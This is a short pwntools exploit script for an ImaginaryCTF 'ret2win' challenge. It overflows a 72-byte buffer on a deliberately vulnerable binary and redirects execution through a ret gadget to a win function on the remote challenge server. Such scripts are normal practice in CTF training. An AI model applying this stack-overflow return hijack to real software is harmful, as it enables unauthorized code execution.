# -- coding: utf-8 --
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# ENV
e = context.binary = ELF('./vuln')
lib = e.libc
# r = e.process()
r = remote("ret2win.chal.imaginaryctf.org", 1337)

# VARIABLE
payload=b"a"*72+flat(0x000000000040101a,0x40117A)
pause()
r.sendline(payload)
r.interactive()
